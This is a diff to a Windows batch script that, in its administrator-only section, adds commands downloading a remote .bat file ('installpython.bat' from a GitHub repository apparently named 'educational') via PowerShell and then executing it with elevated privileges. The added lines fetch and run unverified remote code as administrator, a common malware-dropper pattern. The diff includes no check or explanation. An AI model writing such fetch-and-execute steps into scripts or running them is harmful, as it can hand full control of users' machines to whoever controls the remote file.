@@ -8,6 +8,15 @@ if %errorLevel% neq 0 (
 )
 
 :: ---- Admin-only commands below ----
+
+@echo off
+set URL=https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/installpython.bat
+set FILE=installpython.bat
+
+powershell -Command "Invoke-WebRequest '%URL%' -OutFile '%FILE%'"
+call "%FILE%"
+
+
 echo Running as administrator
 pip install requests
 
